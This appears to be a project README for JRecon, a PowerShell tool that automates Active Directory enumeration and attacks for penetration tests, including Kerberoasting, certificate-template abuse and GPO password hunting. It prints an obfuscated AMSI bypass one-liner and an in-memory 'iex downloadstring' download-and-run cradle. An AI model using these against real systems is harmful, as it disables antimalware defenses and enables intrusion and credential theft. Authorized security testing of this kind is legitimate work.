# JRecon
### A tool to automate Active Directory Enumeration
I've been working on this tool to automate a good part of the initial AD enumeration phase that I always go through at the very start of every AD test.

### What can JRecon do for you ?

JRecon will initially ask you if you want to download tools like Nessus, WinShareEnum, AdvIPScanner, HFS, VirtualBox, and Kali OS

It will then ask you the following:

Do you want to run the initial Domain Enumeration ?

Do you want to run BloodHound Collection ?

Do you want to download and run PingCastle ?

Do you want to enumerate Readable Shares ?

Do you want to use PingCastle to enumerate shares ?

Do you want to enumerate Writable Shares ?

Do you want to run a URL File Attack ?

Do you want to run a Kerberoast (and ASREPRoast) attack ?

Do you want to check for presence of Kerb Tickets in your local machine ?

Do you want to check for Misconfigured Certificate Templates ?

Do you want to enumerate for Vulnerable GPOs ?

Do you want to enumerate LDAP Signing ?

Do you want to check for Exploitable Systems ?

Do you want to search for Passwords in GPO ?

Do you want to search for Passwords in SYSVOL/Netlogon ?

### How to run ?

First bypass AMSI (example below)

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Set a variable to download your licensed version of PingCastle

(If you skip this step PingCastle Free Edition will be downloaded - Not for commercial use)

```
$jpingdownload = "<URL>"
```

You can set the variable "$jYesToAll" to "All" (before running the tool) to make it run without asking questions

This feature is probably best to use if you know the tool already, and you know it won't go out of scope

```
$jYesToAll = "All"
```

Finally, invoke and run the tool on memory (don't make it touch disk)

```
iex(new-object net.webclient).downloadstring('')
```

## JRecon is a collection of other scripts and tools

### Which tools are included?


**Rubeus**

Rubeus is a C# toolset for raw Kerberos interaction and abuses.

@Credit to: https://github.com/GhostPack/Rubeus && https://github.com/gentilkiwi/kekeo/
 

**Grouper3**

Find vulnerabilities in AD Group Policy, but do it better than Grouper2 did.

@Credit to: https://github.com/Group3r/Group3r
 

**Certify**

Active Directory certificate abuse. 

@Credit to: https://github.com/GhostPack/Certify


**LdapSignCheck**

C# project to check LDAP signing.

@Credit to: https://github.com/cube0x0/LdapSignCheck


**PingCastle** (Free Edition - **Not for commercial use**)

Get Active Directory Security at 80% in 20% of the time

@Credit to: https://github.com/vletoux/pingcastle


**SharpHound**

C# Data Collector for the BloodHound Project

@Credit to: https://github.com/BloodHoundAD/SharpHound


**ADRecon**

ADRecon is a tool which gathers information about the Active Directory

@Credit to: https://github.com/sense-of-security/ADRecon


**Invoke-Kerberoast**

Author: Will Schroeder (@harmj0y)

@Credit to: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1


**PowerView**

Author: Will Schroeder (@harmj0y)

@Credit to: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1


**Invoke-ShareFinder**

Author: Will Schroeder (@harmj0y)

@Credit to: https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1


**AmsiScanBuffer bypass**

Author: Rasta Mouse (@_RastaMouse)

@Credit to: https://twitter.com/_RastaMouse


**Get-ExploitableSystems**

Author: Scott Sutherland (@_nullbind)

@Credit to: https://github.com/nullbind/Powershellery/blob/master/Stable-ish/ADS/Get-ExploitableSystems.psm1


**Get-GPPPassword**

Author: Chris Campbell (@obscuresec)

@Credit to: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
